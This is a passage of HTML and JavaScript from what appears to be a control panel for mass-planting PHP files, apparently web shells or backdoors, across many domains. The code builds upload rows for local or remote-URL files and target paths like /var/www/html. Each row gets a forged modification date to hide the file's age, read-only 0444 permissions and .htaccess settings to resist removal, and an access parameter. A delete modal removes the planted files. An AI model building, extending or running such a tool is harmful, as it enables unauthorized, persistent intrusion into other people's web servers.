                <select name="upload_table_data_all[${uploadTableRowCounterAll}][htaccess_enabled]" class="form-control">
                    <option value="no">No</option>
                    <option value="yes">Yes</option>
                </select>
              </td>
            <td rowspan="1" class="col-chmodht-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_htaccess]" value="0444" placeholder="0444" class="form-control"></td>
            <td rowspan="1" class="col-param-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][parameter]" placeholder="?param" class="form-control"></td>
            <td>
                <div class="d-flex">
                    <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                    <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, ${domainEntryCounterAll})">F</button>
                    <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
                    <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), ${fileEntryCounterAll})">+</button>
                    <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, ${fileEntryCounterAll})">X</button>
                </div>
              </td>
        `;
        
        tableBody.appendChild(newRow);
    }
    
    function addFileRowAll(btn, domainId) {
        fileEntryCounterAll++;
        uploadTableRowCounterAll++;
        var newRow = document.createElement('tr');
        newRow.className = 'upload-table-row-all main-row-all';
        newRow.setAttribute('data-row-id-all', uploadTableRowCounterAll);
        newRow.setAttribute('data-file-id-all', fileEntryCounterAll);
        newRow.setAttribute('data-domain-id-all', domainId);
        newRow.style.backgroundColor = '#f5fcf5';
        
        newRow.innerHTML = `
            <td class="col-note-all">
                <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][note]" placeholder="NOTE" class="form-control">
              </td>
            <td class="col-source-all">
                <div class="upload-type-selector">
                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="local" checked onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 📁 Local</label>
                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="remote" onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 🌐 Remote URL</label>
                </div>
                <div class="file-input-wrapper" id="local-input-all-${uploadTableRowCounterAll}">
                    <input type="file" name="upload_files_all[${uploadTableRowCounterAll}]" class="form-control">
                </div>
                <div class="remote-input-wrapper" id="remote-input-all-${uploadTableRowCounterAll}" style="display: none;">
                    <input type="text" name="remote_url_all[${uploadTableRowCounterAll}]" class="form-control remote-url-input" placeholder="https://example.com/file.php">
                </div>
              </td>
            <td>
                <div class="d-flex">
                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][file_id]" value="${fileEntryCounterAll}">
                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][domain_id]" value="${domainId}">
                    <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][path_target]" placeholder="/var/www/html" class="form-control">
                    <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRowAll(this, ${fileEntryCounterAll})">+</button>
                </div>
              </td>
            <td class="col-saveas-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][save_as]" placeholder="auto-detect" class="form-control"></td>
            <td class="col-modify-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control"></td>
            <td class="col-chmodfile-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_file]" value="0444" placeholder="0444" class="form-control"></td>
            <td class="col-htaccess-all">
                <select name="upload_table_data_all[${uploadTableRowCounterAll}][htaccess_enabled]" class="form-control">
                    <option value="no">No</option>
                    <option value="yes">Yes</option>
                </select>
              </td>
            <td class="col-chmodht-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_htaccess]" value="0444" placeholder="0444" class="form-control"></td>
            <td class="col-param-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][parameter]" placeholder="?param" class="form-control"></td>
            <td>
                <div class="d-flex">
                    <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                    <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, ${domainId})">F</button>
                    <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
                    <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), ${fileEntryCounterAll})">+</button>
                    <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, ${fileEntryCounterAll})">X</button>
                </div>
              </td>
        `;

        var domainMainRow = document.querySelector(`.domain-main-row-all[data-domain-id-all="${domainId}"]`);
        if (domainMainRow) {
            var cell = domainMainRow.querySelector('.col-domain-all');
            if (cell) cell.rowSpan = (cell.rowSpan || 1) + 1;
        }

        var associatedRows = document.querySelectorAll(`[data-domain-id-all="${domainId}"]`);
        var lastRow = associatedRows[associatedRows.length - 1];
        lastRow.parentNode.insertBefore(newRow, lastRow.nextSibling);
    }
    
    function addPathRowAll(btn, fileId) {
        uploadTableRowCounterAll++;
        var row = btn.closest('tr');
        var domainId = row.getAttribute('data-domain-id-all');
        var tableBody = document.getElementById('upload-table-body-all');
        var newRow = document.createElement('tr');
        newRow.className = 'upload-table-row-all path-row-all';
        newRow.setAttribute('data-row-id-all', uploadTableRowCounterAll);
        newRow.setAttribute('data-file-id-all', fileId);
        newRow.setAttribute('data-domain-id-all', domainId);
        
        newRow.innerHTML = `
            <td>
                <div class="d-flex">
                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][file_id]" value="${fileId}">
                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][domain_id]" value="${domainId}">
                    <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][path_target]" placeholder="/var/www/html" class="form-control">
                    <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRowAll(this, ${fileId})">+</button>
                </div>
              </td>
            <td>
                <div class="d-flex">
                    <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                    <button type="button" class="btn-action-p" title="Add Path" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), ${fileId})">+</button>
                    <button type="button" class="btn-remove-row" title="Remove Path" onclick="removeUploadRowAll(this, ${fileId})">X</button>
                </div>
              </td>
        `;
        
        var domainMainRow = document.querySelector(`.domain-main-row-all[data-domain-id-all="${domainId}"]`);
        if (domainMainRow) {
            var cell = domainMainRow.querySelector('.col-domain-all');
            if (cell) cell.rowSpan = (cell.rowSpan || 1) + 1;
        }

        var mainRow = document.querySelector(`.main-row-all[data-file-id-all="${fileId}"]`);
        if (mainRow) {
            var colsToSpan = ['.col-note-all', '.col-source-all', '.col-saveas-all', '.col-modify-all', '.col-chmodfile-all', '.col-htaccess-all', '.col-chmodht-all', '.col-param-all'];
            colsToSpan.forEach(function(selector) {
                var cell = mainRow.querySelector(selector);
                if (cell) cell.rowSpan = (cell.rowSpan || 1) + 1;
            });
        }
        
        var currentRow = btn.closest('tr');
        currentRow.parentNode.insertBefore(newRow, currentRow.nextSibling);
    }
    
    function removeUploadRowAll(button, fileId) {
        var row = button.closest('tr');
        var domainId = row.getAttribute('data-domain-id-all');
        var isMainRow = row.classList.contains('main-row-all');
        var isDomainMainRow = row.classList.contains('domain-main-row-all');
        
        if (isDomainMainRow) {
            var associatedRows = document.querySelectorAll(`[data-domain-id-all="${domainId}"]`);
            var mainRows = document.querySelectorAll('.domain-main-row-all');
            if (mainRows.length <= 1) {
                alert('[!] Minimal satu domain harus tersisa.');
                return;
            }
            associatedRows.forEach(function(r) { r.remove(); });
        } else if (isMainRow) {
            var associatedRows = document.querySelectorAll(`[data-file-id-all="${fileId}"]`);
            var domainMainRow = document.querySelector(`.domain-main-row-all[data-domain-id-all="${domainId}"]`);
            if (domainMainRow) {
                var cell = domainMainRow.querySelector('.col-domain-all');
                if (cell) cell.rowSpan -= associatedRows.length;
            }
            associatedRows.forEach(function(r) { r.remove(); });
        } else {
            var domainMainRow = document.querySelector(`.domain-main-row-all[data-domain-id-all="${domainId}"]`);
            if (domainMainRow) {
                var cell = domainMainRow.querySelector('.col-domain-all');
                if (cell && cell.rowSpan > 1) cell.rowSpan--;
            }

            var mainRow = document.querySelector(`.main-row-all[data-file-id-all="${fileId}"]`);
            if (mainRow) {
                var colsToSpan = ['.col-note-all', '.col-source-all', '.col-saveas-all', '.col-modify-all', '.col-chmodfile-all', '.col-htaccess-all', '.col-chmodht-all', '.col-param-all'];
                colsToSpan.forEach(function(selector) {
                    var cell = mainRow.querySelector(selector);
                    if (cell && cell.rowSpan > 1) cell.rowSpan--;
                });
            }
            row.remove();
        }
    }
    
    function duplicateUploadRowAll(btn) {
        var row = btn.closest('tr');
        var domainId = row.getAttribute('data-domain-id-all');
        
        fileEntryCounterAll++;
        uploadTableRowCounterAll++;
        
        var note = row.querySelector('.col-note-all input') ? row.querySelector('.col-note-all input').value : '';
        var isRemote = row.querySelector('input[value="remote"]') && row.querySelector('input[value="remote"]').checked;
        var remoteUrl = row.querySelector('.remote-url-input') ? row.querySelector('.remote-url-input').value : '';
        var saveAs = row.querySelector('.col-saveas-all input') ? row.querySelector('.col-saveas-all input').value : '';
        var modifyDate = row.querySelector('.col-modify-all input') ? row.querySelector('.col-modify-all input').value : '';
        var chmodFile = row.querySelector('.col-chmodfile-all input') ? row.querySelector('.col-chmodfile-all input').value : '0444';
        var htaccess = row.querySelector('.col-htaccess-all select') ? row.querySelector('.col-htaccess-all select').value : 'no';
        var chmodHt = row.querySelector('.col-chmodht-all input') ? row.querySelector('.col-chmodht-all input').value : '0444';
        var param = row.querySelector('.col-param-all input') ? row.querySelector('.col-param-all input').value : '';
        
        var newRow = document.createElement('tr');
        newRow.className = 'upload-table-row-all main-row-all';
        newRow.setAttribute('data-row-id-all', uploadTableRowCounterAll);
        newRow.setAttribute('data-file-id-all', fileEntryCounterAll);
        newRow.setAttribute('data-domain-id-all', domainId);
        newRow.style.backgroundColor = '#fff3e0';
        
        newRow.innerHTML = `
            <td class="col-note-all">
                <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][note]" placeholder="NOTE" class="form-control" value="${note}">
              </td>
            <td class="col-source-all">
                <div class="upload-type-selector">
                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="local" ${!isRemote ? 'checked' : ''} onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 📁 Local</label>
                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="remote" ${isRemote ? 'checked' : ''} onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 🌐 Remote URL</label>
                </div>
                <div class="file-input-wrapper" id="local-input-all-${uploadTableRowCounterAll}" style="display: ${isRemote ? 'none' : 'block'};">
                    <input type="file" name="upload_files_all[${uploadTableRowCounterAll}]" class="form-control">
                </div>
                <div class="remote-input-wrapper" id="remote-input-all-${uploadTableRowCounterAll}" style="display: ${isRemote ? 'block' : 'none'};">
                    <input type="text" name="remote_url_all[${uploadTableRowCounterAll}]" class="form-control remote-url-input" placeholder="https://example.com/file.php" value="${remoteUrl}">
                </div>
              </td>
            <td>
                <div class="d-flex">
                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][file_id]" value="${fileEntryCounterAll}">
                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][domain_id]" value="${domainId}">
                    <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][path_target]" placeholder="/var/www/html" class="form-control" value="">
                    <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRowAll(this, ${fileEntryCounterAll})">+</button>
                </div>
              </td>
            <td class="col-saveas-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][save_as]" placeholder="auto-detect" class="form-control" value="${saveAs}"></td>
            <td class="col-modify-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control" value="${modifyDate}"></td>
            <td class="col-chmodfile-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_file]" value="${chmodFile}" placeholder="0444" class="form-control"></td>
            <td class="col-htaccess-all">
                <select name="upload_table_data_all[${uploadTableRowCounterAll}][htaccess_enabled]" class="form-control">
                    <option value="no" ${htaccess === 'no' ? 'selected' : ''}>No</option>
                    <option value="yes" ${htaccess === 'yes' ? 'selected' : ''}>Yes</option>
                </select>
              </td>
            <td class="col-chmodht-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_htaccess]" value="${chmodHt}" placeholder="0444" class="form-control"></td>
            <td class="col-param-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][parameter]" placeholder="?param" class="form-control" value="${param}"></td>
            <td>
                <div class="d-flex">
                    <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                    <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, ${domainId})">F</button>
                    <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
                    <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), ${fileEntryCounterAll})">+</button>
                    <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, ${fileEntryCounterAll})">X</button>
                </div>
              </td>
        `;

        var domainMainRow = document.querySelector(`.domain-main-row-all[data-domain-id-all="${domainId}"]`);
        if (domainMainRow) {
            var cell = domainMainRow.querySelector('.col-domain-all');
            if (cell) cell.rowSpan = (cell.rowSpan || 1) + 1;
        }

        var associatedRows = document.querySelectorAll(`[data-domain-id-all="${domainId}"]`);
        var lastRow = associatedRows[associatedRows.length - 1];
        lastRow.parentNode.insertBefore(newRow, lastRow.nextSibling);
    }

    function showManualFillHelpAll() {
        alert('[SYSTEM] USAGE (TEBAR SELURUH DOMAIN + REMOTE):\n\n📌 DOMAIN LEVEL:\n- ADD DOMAIN: Buat group domain baru\n- Domain name diisi sekali untuk semua file di domain tsb\n\n📌 FILE LEVEL:\n- Tombol F: Tambah file baru yang kosong\n- Tombol D: Duplicate setting file, Path Target dikosongkan agar bisa diisi path baru\n- Bisa pilih Local atau Remote URL per file\n\n📌 PATH LEVEL (tombol +):\n- Tambah path tujuan untuk file yang sama\n\n🌐 REMOTE UPLOAD:\n- Pilih "Remote URL" lalu masukkan link file');
    }
</script>

<!-- Delete Modal -->
<div class="delete-modal-overlay" id="deleteModal">
    <div class="delete-modal-box">
        <h5><i class="fas fa-exclamation-triangle me-2"></i>CONFIRM DELETE</h5>
        <div class="delete-path-info" id="deletePathInfo"></div>
        <button type="button" class="btn-delete-option btn-delete-php" onclick="executeDelete('php_only')">
            🗑 Hapus File PHP Only
        </button>
        <button type="button" class="btn-delete-option btn-delete-both" onclick="executeDelete('php_and_htaccess')">
            💀 Hapus File PHP + .htaccess
        </button>
        <button type="button" class="btn-delete-option btn-delete-cancel" onclick="closeDeleteModal()">
            ✖ Cancel
        </button>
        <div class="delete-status" id="deleteStatus"></div>
    </div>
</div>

<script>
    // --- Delete File Functions ---
    var currentDeletePath = '';
    var currentDeleteBtn = null;

    function showDeleteModal(filePath, btnElement) {
        currentDeletePath = filePath;
        currentDeleteBtn = btnElement;
        document.getElementById('deletePathInfo').textContent = filePath;
        document.getElementById('deleteStatus').style.display = 'none';
        document.getElementById('deleteStatus').textContent = '';
        document.getElementById('deleteModal').classList.add('active');
    }

    function closeDeleteModal() {
        document.getElementById('deleteModal').classList.remove('active');
        currentDeletePath = '';
        currentDeleteBtn = null;
    }

    function executeDelete(mode) {
        if (!currentDeletePath) return;
        
        var statusEl = document.getElementById('deleteStatus');
        statusEl.style.display = 'block';
        statusEl.style.color = '#ffcc00';
        statusEl.textContent = '⏳ Menghapus file...';
        
        // Disable buttons while processing
        var buttons = document.querySelectorAll('.delete-modal-box .btn-delete-option');
        buttons.forEach(function(b) { b.disabled = true; });
        
        var formData = new FormData();
        formData.append('ajax_delete_file', '1');
        formData.append('delete_path', currentDeletePath);
        formData.append('delete_mode', mode);
        
        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.success) {
                statusEl.style.color = '#00ff88';
                statusEl.textContent = '✓ ' + data.message;
                
                // Update UI - mark as deleted
                if (currentDeleteBtn) {
                    var td = currentDeleteBtn.closest('td');
                    var openLink = td.querySelector('a');
                    if (openLink) {
                        openLink.style.textDecoration = 'line-through';
                        openLink.style.color = '#666';
                        openLink.style.pointerEvents = 'none';
                    }
                    currentDeleteBtn.disabled = true;
                    currentDeleteBtn.textContent = '✓';
                    currentDeleteBtn.style.borderColor = '#00ff88';
                    currentDeleteBtn.style.color = '#00ff88';
                    
                    // Update status column
                    var row = currentDeleteBtn.closest('tr');
                    if (row) {
                        var statusCell = row.querySelector('.status-success');
                        if (statusCell) {
                            statusCell.textContent = '🗑 DELETED';
                            statusCell.style.color = '#ff9900';
                        }
                    }
                }
                
                setTimeout(function() { closeDeleteModal(); }, 1500);
            } else {
                statusEl.style.color = '#ff3333';
                statusEl.textContent = '✗ ' + data.message;
            }
            
            buttons.forEach(function(b) { b.disabled = false; });
        })
        .catch(function(err) {
            statusEl.style.color = '#ff3333';
            statusEl.textContent = '✗ Error: ' + err.message;
            buttons.forEach(function(b) { b.disabled = false; });
        });
    }
    
    // Close modal on overlay click
    document.getElementById('deleteModal').addEventListener('click', function(e) {
        if (e.target === this) closeDeleteModal();
    });
    
    // Close modal on Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') closeDeleteModal();
    });
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>